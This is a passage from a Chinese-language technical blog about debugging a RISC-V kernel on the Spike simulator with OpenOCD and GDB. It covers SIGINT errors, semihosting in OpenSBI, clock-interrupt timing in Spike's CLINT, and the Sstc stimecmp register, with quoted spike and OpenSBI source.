OpenOCD\uff08v0.12+\uff09\uff1a</p> <pre><code>git clone https://github.com/openocd-org/openocd/\ncd openocd\nsudo apt install libtool\n./bootstrap\n./configure --enable-remote-bitbang\nmake\n# output: src/openocd\n</code></pre> <p>\u4e0e\u672c\u5730\u7684 v0.11 \u7684\u76f8\u6bd4\uff0c\u5b83\u8fd0\u884c\u65f6\u591a\u4e86\u4e00\u4e9b error\uff0c\u800c\u4e14\u6070\u5de7\u5728\u6bcf\u6b21 SIGINT \u7684\u540c\u65f6\u90fd\u80fd\u770b\u5230\u65b0\u589e\u4e86\u4e00\u6761 error\uff1a</p> <pre><code>Warn : Failed to read memory via program buffer.\nError: Failed write (NOP) at 0x7; status=2\nError: Failed write (NOP) at 0x6; status=2\nWarn : Failed to read memory via abstract access.\nError: Target riscv.cpu: Failed to read memory (addr=0x0)\nError:   progbuf=failed, sysbus=skipped (unsupported size), abstract=failed\n</code></pre> <p>\u6211\u53c8\u8ba4\u4e3a\u8fd9\u662f OpenOCD+GDB \u5728\u8c03\u8bd5\u65f6\u8bbf\u95ee 0x0 \u5904\u7684\u975e\u6cd5\u5185\u5b58\u5bfc\u81f4\u7684\uff0c\u7ecf\u5b66\u957f\u89e3\u7b54\uff0c0x0 \u5f00\u59cb\u7684\u8fd9\u90e8\u5206\u662f\u4e00\u4e2a debug module\uff0c\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u662f\u4f1a\u7528\u5230\u7684\u3002\u5728 riscv/sim.cc \u7684 <code>sim_t::sim_t</code> \u51fd\u6570\u4e2d\u4e5f\u770b\u5230\u4e86\u5f00\u5934\u5c31\u6709\u4e00\u53e5 <code>bus.add_device(DEBUG_START, &amp;debug_module);</code>\uff0c\u7136\u540e\u6211\u53c8\u53bb\u7ffb\u4e86\u7ffb debug module\uff0c\u5b83\u5728\u4e00\u4e9b\u6307\u5b9a\u7684\u4f4d\u7f6e\u624d\u653e\u4e86\u5185\u5b58\uff0c\u6bd4\u5982 0x800 \u5f00\u59cb\u653e\u4e86 debug rom\uff0c0x374 \u8fd9\u91cc\u653e\u4e86 progbuf\uff0c\u800c\u5176\u4ed6\u6ca1\u653e\u7684\u5730\u65b9\u8bbf\u95ee\u7684\u65f6\u5019\u90fd\u4f1a\u50cf\u8fd9\u6837\u51fa\u9519\u3002\u8fd9\u90e8\u5206\u903b\u8f91\u5728 riscv/debug_module.cc \u7684 <code>debug_module_t::load</code> \u4e2d\uff1a</p> (spike) riscv/debug_module.cc<pre><code>bool debug_module_t::load(reg_t addr, size_t len, uint8_t* bytes)\n{\n  addr = DEBUG_START + addr;\n\n  if (addr &gt;= DEBUG_ROM_ENTRY &amp;&amp;\n      (addr + len) &lt;= (DEBUG_ROM_ENTRY + debug_rom_raw_len)) {\n    memcpy(bytes, debug_rom_raw + addr - DEBUG_ROM_ENTRY, len);\n    return true;\n  }\n\n  ...\n\n  D(fprintf(stderr, \"ERROR: invalid load from debug module: %zd bytes at 0x%016\"\n          PRIx64 \"\\n\", len, addr));\n\n  return false;\n}\n</code></pre> <p>\u5b66\u957f\u8bf4 cosim \u91cc\u9762\u5c4f\u853d\u4e86 0x0 \u8fd9\u4e2a\u5730\u5740\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u5730\u5740\u7684\u4f4d\u7f6e\u653e\u4e86\u4e00\u4e2a\u968f\u673a\u6570\u8bbe\u5907\u6765\u9632\u6b62\u8bfb\u53d6\u51fa\u95ee\u9898\uff0c\u4f46\u6211\u8fd8\u662f\u60f3\u627e\u5230\u95ee\u9898\u6240\u5728\uff0c\u6240\u4ee5\u7ee7\u7eed\u8c03\u4e86\u3002</p> <p>\u5c06\u672b\u5c3e\u7684 D() \u53bb\u6389\uff0c\u7136\u540e return true \u5c31\u80fd\u8ba9\u6240\u6709 0x0 - 0x1000 \u7684\u8bbf\u5b58\u5408\u6cd5\uff0c\u518d\u8dd1\u4e00\u6b21\u53d1\u73b0 OpenOCD \u90a3\u91cc\u786e\u5b9e\u6ca1\u6709\u62a5\u9519\u4e86\uff0c\u7136\u540e\u6bcf\u6b21\u90fd\u4f1a\u4ece 0x0 \u5f00\u59cb\u8bf7\u6c42\u4e00\u4e32\u5185\u5b58\uff0c\u8fd9\u91cc\u90fd\u4f1a\u62a5 ERROR\u3002\u4f46\u5373\u4f7f OpenOCD \u6ca1\u4e86\u62a5\u9519\uff0cGDB \u8fd8\u662f\u4f1a\u50cf\u539f\u5148\u4e00\u6837\u9694\u4e00\u9635\u9047\u5230\u4e00\u4e2a SIGINT\uff0c\u6240\u4ee5\u90a3\u8fd9\u4e2a SIGINT \u4e5f\u4e0d\u662f\u7531\u4e8e OpenOCD \u8bfb debug \u4fe1\u606f\u9519\u8bef\u5bfc\u81f4\u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u5c31\u7ffb\u4e86\u7ffb OpenOCD \u7684\u6587\u6863\uff0c\u53d1\u73b0\u4e86\u5728 GDB \u76f8\u5173\u7684 20.2 \u8282\u7ed9\u51fa\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 GDB \u8c03\u8bd5\u6848\u4f8b\uff1a</p> <pre><code>$ arm-none-eabi-gdb example.elf\n(gdb) target extended-remote localhost:3333\nRemote debugging using localhost:3333\n...\n(gdb) monitor reset halt\n...\n(gdb) load\nLoading section .vectors, size 0x100 lma 0x20000000\nLoading section .text, size 0x5a0 lma 0x20000100\nLoading section .data, size 0x18 lma 0x200006a0\nStart address 0x2000061c, load size 1720\nTransfer rate: 22 KB/sec, 573 bytes/write.\n(gdb) continue\nContinuing.\n...\n</code></pre> <p>\u8fd9\u91cc\u591a\u4e86\u4e00\u53e5 <code>monitor reset halt</code> \u4e0d\u77e5\u9053\u662f\u5e72\u4ec0\u4e48\uff0c\u7136\u540e\u968f\u624b\u4e00\u8bd5\uff0c\u52a0\u4e0a\u8fd9\u4e00\u53e5\u4e4b\u540e SIGINT \u5c31\u6d88\u5931\u4e86\uff0c\u53ef\u4ee5\u6b63\u5e38\u8c03\u8bd5\u4e86\u3002\u6216\u8005\u5728 spike.cfg \u914d\u7f6e\u7684\u6700\u540e\u628a <code>halt</code> \u6539\u6210 <code>reset halt</code> \u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a GDB \u7684 <code>monitor</code> \u5c31\u76f8\u5f53\u4e8e\u53d1\u6307\u4ee4\u7ed9 OpenOCD\u3002\u53c8\u641c\u4e86\u4e00\u4e9b\u4e5f\u6ca1\u627e\u5230\u8fd9\u6837\u505a\u7684\u7406\u7531\uff0c\u542c\u5230\u7684\u8bf4\u6cd5\u90fd\u662f\u5237\u65b0\u7a0b\u5e8f\uff0c\u8ba9\u5b83\u597d\u63a5\u6536\u540e\u9762\u7684\u65ad\u70b9\u548c\u8c03\u8bd5\u3002\u6240\u4ee5\u8c03\u4e86\u597d\u4e45\u6700\u540e\u539f\u56e0\u662f OpenOCD \u7684\u914d\u7f6e\u95ee\u9898\uff0c\u4f46\u4e3a\u4ec0\u4e48 cosim \u7684\u8001 spike \u6ca1\u9047\u5230\u95ee\u9898\u8fd8\u662f\u6ca1\u89e3\u51b3\uff0c\u4f46\u5df2\u7ecf\u65e0\u6240\u8c13\u4e86\u611f\u89c9\u3002</p>"},{"location":"cs/pl/riscv/spike/#semihosting","title":"Semihosting \u76f8\u5173","text":"<p>\u63a5\u4e0b\u6765\u6ca1\u6709 SIGINT \u5c31\u53ef\u4ee5\u4e00\u76f4\u8dd1\u8d77\u6765\u7684\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u65ad\u5728 _start \u7684\u65ad\u70b9\u7684\u4f4d\u7f6e\uff0c\u800c\u662f\u5728 OpenSBI \u4e2d\u7684 ebreak\uff0c\u8fd9\u4e2a ebreak \u662f\u5728 <code>_semihost_test_vector_next</code> \u6807\u53f7\u91cc\u7684\uff0c\u8fd9\u4e2a\u662f\u7531 OpenSBI \u7684 lib/utils/serial/semihosting.c \u7684 semihosting_enabled \u51fd\u6570\u5f15\u5165\u7684\u3002\u5b66\u957f\u8bf4\u662f\u56e0\u4e3a spike \u5e76\u6ca1\u6709\u652f\u6301 semihosting \u673a\u5236\uff0c\u6240\u4ee5\u5728\u4e4b\u524d\u4f7f\u7528\u7684 OpenSBI \u4e2d\u624b\u52a8\u5728 semihosting_enabled \u548c semihosting_trap \u51fd\u6570\u7684\u5f00\u5934\u76f4\u63a5 return \u4e86 0 \u6765 patch \u6389\u3002</p> <p>\u641c\u4e86\u4e00\u4e0b semihosting \u76f8\u5173\uff0c\u8fd9\u662f\u4e00\u4e2a\u7531 arm \u5f15\u5165\u7684\u8c03\u8bd5\u65b9\u6cd5\u3002\u56e0\u4e3a\u786c\u4ef6\u4e0a\u901a\u8fc7\u4e32\u53e3\u8f93\u51fa\u8fd8\u8981\u7ecf\u8fc7\u8bbe\u5907\u65f6\u5e8f\u7b49\u4e00\u7cfb\u5217\uff0c\u4f1a\u52a0\u91cd\u8c03\u8bd5\u8d1f\u62c5\uff0c\u6240\u4ee5 semihosting \u673a\u5236\u901a\u8fc7\u5c06\u8f93\u51fa\u7b49\u4e00\u7cfb\u5217\u529f\u80fd\u4ea4\u7ed9\u8c03\u8bd5\u4e3b\u673a\u6765\u505a\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u786c\u4ef6\u4e32\u53e3\u652f\u6301\u4e86\u3002\u53ea\u9700\u8981\u5728\u6bd4\u5982 print \u8f93\u51fa\u7684\u65f6\u5019\u8c03\u7528\u4e00\u4e0b SVC HLT BKPT \u7b49\u53ef\u4ee5\u8ba9\u8c03\u8bd5\u5668\u63a5\u624b\u7684\u6307\u4ee4\uff0c\u7136\u540e\u8c03\u8bd5\u5668\u4f1a\u5b89\u88c5\u534f\u8bae\u8bfb\u53d6\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\u7b49\uff0c\u7531\u8c03\u8bd5\u5668\u6765\u8fdb\u884c\u8f93\u51fa\u3002</p> <p>\u5728 RISC-V \u4e0a\uff0c\u8fd9\u6837\u9677\u5165\u8c03\u8bd5\u5668\u7684\u6307\u4ee4\u662f ebreak\uff0c\u4f46\u662f\u4e5f\u53ea\u6709 ebreak\uff0c\u65e0\u6cd5\u533a\u5206\u666e\u901a ebreak \u548c semihosting \u7528\u7684 ebreak\u3002\u6240\u4ee5 RISC-V \u89c4\u5b9a\uff0csemihosting \u7684 ebreak \u524d\u540e\u4f1a\u8ddf\u4e24\u6761\u7279\u6b8a\u7684 nop \u6307\u4ee4\uff0c\u5f62\u6210\uff1a</p> <pre><code>slli x0, x0, 0x1f\nebreak\nsrai x0, x0, 7\n</code></pre> <p>\u8c03\u8bd5\u5668\u5728\u9047\u5230 ebreak \u4e4b\u540e\u53ef\u4ee5\u68c0\u67e5\u524d\u540e\u4e24\u6761\u6307\u4ee4\uff0c\u5982\u679c\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u90a3\u4e48\u5c31\u662f semihosting \u7684 ebreak\uff0c\u5426\u5219\u5c31\u662f\u666e\u901a\u7684 ebreak\u3002\u8fd9\u4e2a\u662f\u5728 RISC-V \u7684 riscv-non-isa/riscv-semihosting \u4e2d\u89c4\u5b9a\u7684\u3002</p> <p>\u770b\u4e86 spike \u7684\u6e90\u7801\uff0c\u5173\u4e8e ebreak \u6307\u4ee4\u7684\u5904\u7406\u786e\u5b9e\u6ca1\u6709\u68c0\u67e5\u524d\u540e\u4e24\u6761\u6307\u4ee4\u7684\u64cd\u4f5c\u3002\u4f46\u8f6c\u5ff5\u4e00\u60f3\uff0cspike \u4f5c\u4e3a\u4e00\u4e2a\u6307\u4ee4\u6a21\u62df\u5668\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a\u5f85\u8c03\u8bd5\u7684\u786c\u4ef6\u8bbe\u5907\uff0c\u800c\u771f\u6b63\u5904\u7406 semihosting \u7684\u5e94\u8be5\u662f\u8c03\u8bd5\u5668\uff0c\u800c\u5728\u8fd9\u5957\u5de5\u5177\u94fe\u91cc\u8c03\u8bd5\u5668\u662f OpenOCD\uff0c\u6240\u4ee5\u5b9e\u9645\u7684\u5de5\u4f5c\u5e94\u8be5\u5728 OpenOCD \u5c42\u9762\uff0c\u5728\u6536\u5230 ebreak \u4e4b\u540e\u989d\u5916\u68c0\u67e5\u4e24\u6761\u6307\u4ee4\u3002</p> <p>\u7ecf\u8fc7\u641c\u7d22\uff0cOpenOCD \u8fd8\u771f\u6709\u8fd9\u4e48\u4e00\u6761\u6307\u4ee4 <code>arm semihosting enable</code>\uff0c\u4e5f\u5c31\u662f GDB \u91cc\u7684 <code>monitor arm semihosting enable</code>\u3002\u8dd1\u4e86\u8fd9\u6761\u6307\u4ee4\u4e4b\u540e GDB \u5c31\u4e0d\u4f1a\u518d\u5361\u5728 semihosting \u7684 ebreak \u4e86\uff0c\u56e0\u4e3a\u8fd9\u90e8\u5206\u5df2\u7ecf\u88ab OpenOCD \u89e3\u6790\u6210\u4e86 semihosting \u8bf7\u6c42\u6765\u7279\u6b8a\u5904\u7406\u4e86\uff0c\u800c\u4e14 OpenSBI \u8f93\u51fa\u7684 platform console device \u4e5f\u4ece uart8250 \u53d8\u6210\u4e86 semihosting\u3002\u4e5f\u56e0\u6b64\uff0c\u8f93\u51fa\u7b49\u64cd\u4f5c\u5c31\u7531 OpenOCD \u6765\u5b8c\u6210\u4e86\uff0c\u800c\u975e spike \u7684\u4e32\u53e3\u3002\u6240\u4ee5\u8fd9\u65f6\u5019\u7684\u5185\u6838\u8f93\u51fa\u5728\u8fd0\u884c\u7740 <code>make spike_bridge</code> \u7684\u7ec8\u7aef\u91cc\uff0c\u800c\u4e14\u8fd9\u5957\u6548\u7387\u5e76\u6bd4\u4e0d\u4e0a\u4e32\u53e3\uff0c\u6240\u4ee5\u6548\u7387\u5f88\u4f4e\uff0c\u4ee5\u81f3\u4e8e\u6548\u679c\u4e0a\u662f\u9010\u4e2a\u5b57\u8fdb\u884c\u8f93\u51fa\u3002</p> <p>\u6240\u4ee5\u4e3a\u4e86\u8c03\u8bd5\u6548\u7387\uff0c\u8fd8\u662f\u4e0d\u542f\u7528 semihosting \u4e3a\u597d\uff0c\u4f46\u4e5f\u4e0d\u7528\u76f4\u63a5 patch \u6389\u76f8\u5173\u903b\u8f91\uff0cOpenSBI \u63d0\u4f9b\u4e86 kconfig \u6765\u8fdb\u884c\u914d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\uff1a</p> <pre><code>make PLATFORM=generic menuconfig\n</code></pre> <p>\u7136\u540e\u5c06 Utils and Drivers Support &gt; Serial Device Support &gt; Semihosting support \u5173\u6389\u518d make \u5c31\u597d\u4e86\u3002</p>"},{"location":"cs/pl/riscv/spike/#_2","title":"\u65f6\u949f\u4e2d\u65ad\u76f8\u5173","text":"<p>\u6700\u540e\u4e00\u4e2a\u95ee\u9898\u662f spike \u8fd0\u884c\u7684 kernel \u7684\u65f6\u949f\u4e2d\u65ad\u5468\u671f\u548c busy loop \u957f\u5ea6\u90fd\u8981\u5c11\u4e00\u4e2a 0 \u624d\u80fd\u8fbe\u5230\u548c qemu \u4e00\u6837\u7684\u6548\u679c\uff0c\u4e5f\u5c31\u662f\u5b9e\u9645\u4e0a\u7684\u65f6\u949f\u9891\u7387\u662f 1_000_000 Hz\uff0c\u4e0d\u8fc7 spike \u8fd0\u884c\u7684 OpenSBI \u8f93\u51fa\u7684 platform timer device \u8fd8\u662f\u90fd\u662f\u4e00\u6837\u7684 aclint-mtimer @ 10000000Hz\u3002</p> <p>\u627e\u4e86 OpenSBI \u7684\u6e90\u7801\uff0c\u5bf9\u4e8e generic platform\uff0ctimer \u7684\u9891\u7387\u662f\u4ece\u8bbe\u5907\u6811\u4e2d\u8bfb\u53d6\u7684\u3002generic \u4f7f\u7528\u4e86 fdt_timer_mtimer\uff0c\u5176\u4e2d\u7684 cold init \u8c03\u7528\u4e86 OpenSBI \u7684 lib/utils/timer/fdt_timer_mtimer.c \u7684 <code>timer_mtimer_cold_init</code> \u51fd\u6570\uff1a</p> (opensbi) lib/utils/timer/fdt_timer_mtimer.c<pre><code>static int timer_mtimer_cold_init(const void *fdt, int nodeoff,\n                  const struct fdt_match *match)\n{\n    ...\n\n    rc = fdt_parse_timebase_frequency(fdt, &amp;mt-&gt;mtime_freq);\n    if (rc) {\n        sbi_free(mtn);\n        return rc;\n    }\n</code></pre> <p>\u8fd9\u91cc <code>fdt_parse_timebase_frequency</code> \u5c31\u662f\u5728\u8bfb\u53d6\u8bbe\u5907\u6811\u4e2d\u7684 <code>timebase-frequency</code> \u5c5e\u6027\uff0c\u800c\u8fd9\u4e2a\u5c5e\u6027\u5728 spike \u5bfc\u51fa\u65f6\u5c31\u662f 10_000_000\uff1a</p> (spike) riscv/sim.cc<pre><code>    dts = make_dts(INSNS_PER_RTC_TICK, CPU_HZ, cfg, mems, device_nodes);\n</code></pre> (spike) riscv/dts.cc<pre><code>         \"    timebase-frequency = &lt;\" &lt;&lt; (cpu_hz/insns_per_rtc_tick) &lt;&lt; \"&gt;;\\n\";\n</code></pre> <p>\u8fd9\u91cc CPU_HZ \u662f 1_000_000_000\uff0cINSNS_PER_RTC_TICK \u662f 100\uff0c\u6240\u4ee5 freq \u662f 10_000_000 \u6ca1\u9519\u3002</p> <p>\u4f46\u4e3a\u4ec0\u4e48 spike \u8dd1\u8d77\u6765\u5b9e\u9645\u6bd4\u8fd9\u4e2a\u8981\u6162\u5f97\u591a\u5462\uff0c\u6309\u7406\u8bf4 10_000_000Hz \u7684\u65f6\u949f\u9891\u7387\uff0c\u8bbe\u5b9a 10_000_000 \u7684\u65f6\u949f\u4e2d\u65ad\u95f4\u9694\u90a3\u51fa\u73b0\u7684\u5c31\u662f 1s \u4e00\u4e2a\uff0c\u4e3a\u4ec0\u4e48\u4f1a 10s \u4e00\u4e2a\u3002\u539f\u56e0\u5728\u4e8e spike \u5bf9\u4e8e mtime \u7684\u5904\u7406\uff1a</p> (spike) riscv/clint.cc<pre><code>void clint_t::tick(reg_t rtc_ticks)\n{\n  if (real_time) {\n   struct timeval now;\n   uint64_t diff_usecs;\n\n   gettimeofday(&amp;now, NULL);\n   diff_usecs = ((now.tv_sec - real_time_ref_secs) * 1000000) + (now.tv_usec - real_time_ref_usecs);\n   mtime = diff_usecs * freq_hz / 1000000;\n  } else {\n    mtime += rtc_ticks;\n  }\n\n  for (const auto&amp; [hart_id, hart] : sim-&gt;get_harts()) {\n    hart-&gt;state.time-&gt;sync(mtime);\n    hart-&gt;state.mip-&gt;backdoor_write_with_mask(MIP_MTIP, mtime &gt;= mtimecmp[hart_id] ? MIP_MTIP : 0);\n  }\n}\n</code></pre> <p>clint \u662f Core Local Interruptor\uff0c\u5c40\u90e8\u4e2d\u65ad\u5668\uff0c\u8d1f\u8d23\u4ea7\u751f\u8f6f\u4ef6\u4e2d\u65ad\u548c\u65f6\u949f\u4e2d\u65ad\u3002\u8fd9\u91cc\u4e5f\u770b\u5f97\u51fa\uff0c\u5728 <code>mtime &gt;= mtimecmp[hard_id]</code> \u7684\u65f6\u5019\u8bbe\u7f6e mip \u7684 mtip \u4f4d\uff0c\u5373\u544a\u8bc9 core \u53c8\u4e00\u4e2a\u65f6\u949f\u4e2d\u65ad\u5728\u7b49\u5f85\u5904\u7406\u3002</p> <p>\u800c mtime \u66f4\u65b0\u7684\u903b\u8f91\u5728\u524d\u9762\uff0c\u5982\u679c\u6709 real_time \u7684\u60c5\u51b5\u4e0b\uff0cmtime \u6309\u7167\u5b9e\u9645\u65f6\u95f4\u66f4\u65b0\uff0c\u5047\u8bbe\u6211\u4eec\u7ecf\u8fc7\u4e86 1s \u7684\u65f6\u95f4\uff0c\u90a3 diff_usecs \u5c31\u662f 1_000_000\uff0c\u6240\u4ee5 mtime = freq_hz\uff0c\u4e5f\u5c31\u662f 10_000_000\uff0c\u8fd9\u6837 1s \u4e4b\u540e mtime \u5c31\u591a\u4e86 10_000_000\uff0c\u5982\u679c mtimecmp \u8bbe\u7f6e\u7684\u95f4\u9694\u4e5f\u662f\u8fd9\u4e2a\uff0c\u90a3\u5c31\u662f 1s \u4e00\u4e2a\u4e2d\u65ad\u3002\u5b9e\u9645\u8dd1\u8d77\u6765\uff0c\u5982\u679c\u52a0\u4e0a <code>--real-time-clint</code> \u7684\u8bdd\uff0c\u65f6\u949f\u4e2d\u65ad\u786e\u5b9e\u5c31 1s \u51fa\u73b0\u4e00\u4e2a\u4e86\uff08\u95f4\u9694 10_000_000\uff09\u3002</p> <p>\u90a3\u5982\u679c\u4e0d\u52a0 real_time \u5462\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e3a\u4ec0\u4e48\u4e4b\u524d\u4f1a\u51fa\u73b0 10s \u4e00\u4e2a\u4e2d\u65ad\u7684\u60c5\u51b5\u3002\u6211\u4eec\u518d\u6b21\u5047\u8bbe mtimecmp \u7684\u95f4\u9694\u662f 10_000_000\uff0c\u770b\u4e00\u4e0b\u591a\u4e45\u4f1a\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f mtime \u4ec0\u4e48\u65f6\u5019\u80fd\u591a\u52a0 10_000_000 \u4e2a rtc_ticks\u3002\u56e0\u4e3a INSN_PER_RTC_TICK \u662f 100\uff0c\u6240\u4ee5\u8dd1 100 \u6761\u6307\u4ee4\u591a\u4e00\u4e2a rtc_tick\uff0c\u90a3\u89e6\u53d1\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad\u5c31\u8981\u8dd1 1_000_000_000 \u6761\u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u548c\u8dd1\u4e86\u591a\u5c11\u6761\u6307\u4ee4\u6709\u5173\uff0c\u548c\u5b9e\u9645\u65f6\u95f4\u65e0\u5173\uff0c\u6240\u4ee5\u4f53\u611f 10s \u4e00\u4e2a\u4e2d\u65ad\u5b9e\u9645\u4e0a\u662f\u7eaf\u7cb9\u7684 spike \u8dd1\u7684\u6162\u3002</p> <p>\u6240\u4ee5\u4e3a\u4e86 qemu \u548c spike \u4e00\u6837\u7684\u8868\u73b0\uff0c\u53ea\u9700\u8981\u5728 spike \u8fd0\u884c\u7684\u65f6\u5019\u52a0\u4e0a <code>--real-time-clint</code> \u5c31\u597d\u4e86\uff0c\u4ee5\u53ca\u5982\u679c\u6709 busy loop \u8f93\u51fa\u7684\u8bdd\u8fd8\u9700\u8981\u6309 10 \u500d\u7684\u89c4\u6a21\u8c03\u6574\u4e00\u4e0b\u5faa\u73af\u6b21\u6570\u3002</p>"},{"location":"cs/pl/riscv/spike/#memory-mapping-stimecmp","title":"\u5173\u4e8e memory-mapping \u4e0e stimecmp","text":"<p>\u8c03\u8bd5\u7684\u65f6\u5019\u6709\u7684\u65f6\u5019\u60f3\u8981\u627e mtime \u548c mtimecmp \u7684\u503c\u5230\u5e95\u662f\u591a\u5c11\uff0c\u4f46\u662f GDB \u5e76\u4e0d\u80fd\u8bfb\u53d6\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e24\u4e2a\u90fd\u662f memory mapping \u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ed6\u4eec\u7684\u5b9e\u9645\u4f4d\u7f6e\u5728\u5185\u5b58\u4e0a\u800c\u975e\u5bc4\u5b58\u5668\u4e2d\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u5185\u5b58\u6765\u83b7\u53d6\u8fd9\u4e24\u4e2a\u503c\uff1a</p> <pre><code>p/x {unsigned long long}0x2004000 # mtimecmp\np/x {unsigned long long}0x200bff8 # mtime\n</code></pre> <p>Spike \u548c qemu \u90fd\u662f\u540c\u6837\u7684\u5730\u5740\uff08spike \u76f8\u5173\u4ee3\u7801\u540c\u6837\u53ef\u4ee5\u5728 riscv/clint.cc \u4e2d\u627e\u5230\uff0c\u4e5f\u5c31\u662f load \u548c store \u4e24\u4e2a\u51fd\u6570\uff09\u3002</p> <p>\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0b\u5373\u4f7f\u8bbe\u7f6e\u4e86 mtimecmp \u4e5f\u4e0d\u4f1a\u53d1\u73b0 0x2004000 \u5730\u5740\u4e0a\u6709\u53d8\u5316\uff08\u6bd4\u5982\u8f83\u65b0\u7684 qemu \u8dd1\u6700\u65b0\u7684 OpenSBI\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 sbi \u6765\u8c03\u67e5\u8fd9\u4e2a\u95ee\u9898\uff0c\u65f6\u949f\u4e2d\u65ad\u7684\u8bbe\u7f6e\u662f\u901a\u8fc7\u8c03\u7528 sbi_set_timer \u5b8c\u6210\u7684\uff0c\u901a\u8fc7\u7ffb OpenSBI \u6e90\u7801\u53ef\u4ee5\u627e\u5230\u8fd9\u4e2a set_timer \u7684\u5b9e\u9645\u5904\u7406\u51fd\u6570\u5728 lib/sbi/sbi_timer.c \u91cc\uff1a</p> (opensbi) lib/sbi/sbi_timer.c<pre><code>void sbi_timer_event_start(u64 next_event)\n{\n    sbi_pmu_ctr_incr_fw(SBI_PMU_FW_SET_TIMER);\n\n    /**\n     * Update the stimecmp directly if available. This allows\n     * the older software to leverage sstc extension on newer hardware.\n     */\n    if (sbi_hart_has_extension(sbi_scratch_thishart_ptr(), SBI_HART_EXT_SSTC)) {\n#if __riscv_xlen == 32\n        csr_write(CSR_STIMECMP, next_event &amp; 0xFFFFFFFF);\n        csr_write(CSR_STIMECMPH, next_event &gt;&gt; 32);\n#else\n        csr_write(CSR_STIMECMP, next_event);\n#endif\n    } else if (timer_dev &amp;&amp; timer_dev-&gt;timer_event_start) {\n        timer_dev-&gt;timer_event_start(next_event);\n        csr_clear(CSR_MIP, MIP_STIP);\n    }\n    csr_set(CSR_MIE, MIP_MTIP);\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2a if \u903b\u8f91\uff0c\u5982\u679c sbi hart \u6709 sstc \u6269\u5c55\uff0c\u5219\u5199\u5165 stimecmp csr \u5bc4\u5b58\u5668\u7ed3\u675f\uff0c\u5426\u5219\u8c03\u7528 timer_dev \u7684 timer_event_start\uff0c\u800c qemu \u548c spike \u90fd\u5728\u4f7f\u7528\u7684 aclint_mtimer \u8bbe\u5907\u7684 timer_event_start \u5c31\u662f\u5728\u8bfb\u53d6 mtimecmp \u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u90e8\u5206\u903b\u8f91\u662f\u8bbe\u7f6e 0x2004000 \u7684\u503c\u7684\u3002\u90a3\u4e48\u5982\u679c 0x2004000 \u4e00\u76f4\u662f -1 \u7684\u8bdd\uff0c\u5c31\u8bf4\u660e\u5df2\u7ecf\u8d70\u4e86 sstc \u6269\u5c55\u7684 stimecmp \u5bc4\u5b58\u5668\u4e86\u3002</p> <p>Sstc \u6269\u5c55\u662f\u4e3a\u4e86\u89e3\u51b3\u6bcf\u6b21\u8bbe\u7f6e\u65f6\u949f\u4e2d\u65ad\u90fd\u9700\u8981\u8fdb\u5165 sbi \u9677\u5165 M \u6a21\u5f0f\u8bbe\u7f6e mtimecmp \u7684\u503c\u5bfc\u81f4\u6548\u7387\u4e0b\u964d\u7684\uff0c\u8fd9\u4e2a\u6269\u5c55\u5f15\u5165\u4e86 stimecmp csr \u5bc4\u5b58\u5668\uff0c\u540c\u65f6\u89c4\u5b9a\u53ea\u8981 mtime &gt;= stimecmp \u76f4\u63a5\u89e6\u53d1 S \u6a21\u5f0f\u65f6\u949f\u4e2d\u65ad\u3002\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u4ece memory mapping \u8bbe\u7f6e mtimecmp \u518d\u89e6\u53d1 M \u6001\u65f6\u949f\u4e2d\u65ad\u540e\u518d\u901a\u8fc7 mideleg \u8f6c\u53d1\u5230 S \u6a21\u5f0f\u7684\u8fc7\u7a0b\uff0c\u63d0\u9ad8\u4e86\u6548\u7387\u3002\u662f\u5426\u542f\u7528\u4e86 sstc \u53ef\u4ee5\u770b OpenSBI \u8f93\u51fa\u7684 boot hart isa extensions\uff0c\u5982\u679c\u91cc\u9762\u6709 sstc \u5c31\u8bf4\u660e\u542f\u7528\u4e86\u3002</p> <p>\u800c spike \u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f sstc \u7684\uff0c\u4f46\u662f\u5b83\u4e5f\u652f\u6301\uff0c\u5728\u4e0a\u9762 clint.cc \u7684 114 \u884c\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a <code>hart-&gt;state.time-&gt;sync(mtime)</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u5185\u5bb9\u5982\u4e0b\uff1a</p> (spike) riscv/csrs.cc<pre><code>void time_counter_csr_t::sync(const reg_t val) noexcept {\n  shadow_val = val;\n  if (proc-&gt;extension_enabled(EXT_SSTC)) {\n    const reg_t mip_val = (shadow_val &gt;= state-&gt;stimecmp-&gt;read() ? MIP_STIP : 0) |\n      (shadow_val + state-&gt;htimedelta-&gt;read() &gt;= state-&gt;vstimecmp-&gt;read() ? MIP_VSTIP : 0);\n    const reg_t mask = ((state-&gt;menvcfg-&gt;read() &amp; MENVCFG_STCE) ? MIP_STIP : 0) | ((state-&gt;henvcfg-&gt;read() &amp; HENVCFG_STCE) ? MIP_VSTIP : 0);\n    state-&gt;mip-&gt;backdoor_write_with_mask(mask, mip_val);\n  }\n}\n</code></pre> <p>\u6240\u4ee5\u8fd9\u4e2a sync \u5b9e\u9645\u4e0a\u5c31\u662f\u5728\u542f\u7528 sstc \u7684\u65f6\u5019\u68c0\u6d4b\u662f\u5426\u6839\u636e stimecmp \u89e6\u53d1\u65f6\u949f\u4e2d\u65ad\u3002spike 